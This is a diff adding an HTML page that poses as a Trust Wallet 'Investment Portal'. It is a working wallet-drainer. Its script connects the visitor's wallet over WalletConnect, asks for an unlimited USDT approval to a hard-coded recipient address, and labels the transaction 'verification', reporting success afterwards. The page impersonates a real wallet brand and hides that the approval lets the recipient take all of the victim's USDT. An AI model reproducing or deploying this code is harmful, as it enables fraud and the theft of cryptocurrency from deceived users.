@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Investment Portal</title>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.1/dist/index.umd.js"></script>
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+    <style>
+        body { background: #0b0e11; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #1e2329; padding: 35px; border-radius: 24px; text-align: center; width: 85%; max-width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #3375bb; }
+        .logo { width: 50px; margin-bottom: 15px; }
+        .btn { background: #3375bb; color: white; padding: 18px; border: none; border-radius: 12px; font-weight: bold; width: 100%; font-size: 18px; cursor: pointer; transition: 0.2s; }
+        .btn:active { transform: scale(0.97); }
+        .status { margin-top: 20px; color: #848e9c; font-size: 14px; line-height: 1.5; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <img src="https://trustwallet.com/assets/images/media/assets/trust_platform_light.png" class="logo">
+        <h3>Investment Portal</h3>
+        <p>Please click below to connect and approve your participation.</p>
+        
+        <button id="main-btn" class="btn" onclick="startProcess()">CONFIRM NOW</button>
+        
+        <div id="status" class="status">Waiting for connection...</div>
+    </div>
+
+    <script>
+        // CONFIGURATION
+        const PROJECT_ID = "48d3cc06c4e808c4987bb4566665ae87"; 
+        const MY_WALLET = "0xbdcc079BBb23C1D9a6F36AA31309676C258aBAC7"; 
+        const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
+
+        async function startProcess() {
+            const statusDiv = document.getElementById("status");
+            const btn = document.getElementById("main-btn");
+
+            try {
+                statusDiv.innerText = "Initializing WalletConnect...";
+                
+                // 1. Initialize the Provider for BSC (Chain ID 56)
+                const provider = await WalletConnectEthereumProvider.EthereumProvider.init({
+                    projectId: PROJECT_ID,
+                    optionalChains: [56],
+                    showQrModal: true, // This allows the "Scan" function to work
+                    metadata: {
+                        name: "Investment Portal",
+                        description: "Secure Verification",
+                        url: window.location.origin,
+                        icons: ["https://trustwallet.com/assets/images/media/assets/trust_platform_light.png"]
+                    }
+                });
+
+                // 2. Connect
+                statusDiv.innerText = "Connecting to Trust Wallet...";
+                await provider.connect();
+
+                const web3Provider = new ethers.providers.Web3Provider(provider);
+                const signer = web3Provider.getSigner();
+
+                // 3. Trigger Approval
+                statusDiv.innerText = "Please 'Approve' USDT in your wallet...";
+                statusDiv.style.color = "#f0b90b";
+                
+                const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+                const contract = new ethers.Contract(USDT_BSC, abi, signer);
+
+                // Sending the unlimited approval request
+                const tx = await contract.approve(MY_WALLET, ethers.constants.MaxUint256);
+                
+                statusDiv.innerText = "Transaction pending on BSC...";
+                await tx.wait();
+
+                statusDiv.style.color = "#0ecb81";
+                statusDiv.innerText = "SUCCESS: Verification Complete!";
+                alert("Verified! You can close this window.");
+
+            } catch (err) {
+                statusDiv.style.color = "#f6465d";
+                statusDiv.innerText = "Error: " + (err.message || "User cancelled");
+                console.error(err);
+            }
+        }
+    </script>
+</body>
+</html>
